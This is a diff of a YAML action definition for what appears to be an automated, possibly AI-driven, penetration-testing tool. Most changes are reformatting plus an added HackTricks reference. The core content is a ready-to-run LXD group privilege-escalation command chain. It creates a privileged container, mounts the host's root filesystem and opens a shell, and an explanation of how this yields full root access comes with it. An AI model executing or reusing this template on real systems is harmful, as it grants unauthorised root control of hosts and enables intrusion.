@@ -2,15 +2,19 @@ name: lxd_privesc
 category: privesc
 description: LXD group privilege escalation
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "lxc init ubuntu:20.04 privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc /bin/sh"
+command_template: lxc init ubuntu:20.04 privesc -c security.privileged=true && lxc
+  config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+  && lxc start privesc && lxc exec privesc /bin/sh
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "LXD group = root equivalent (same as Docker). Create privileged container with host filesystem mounted. Access /mnt/root for full host filesystem as root."
+mechanism: LXD group = root equivalent (same as Docker). Create privileged container
+  with host filesystem mounted. Access /mnt/root for full host filesystem as root.
+hacktricks_ref: linux-hardening/privilege-escalation/interesting-groups-linux-pe/README.md
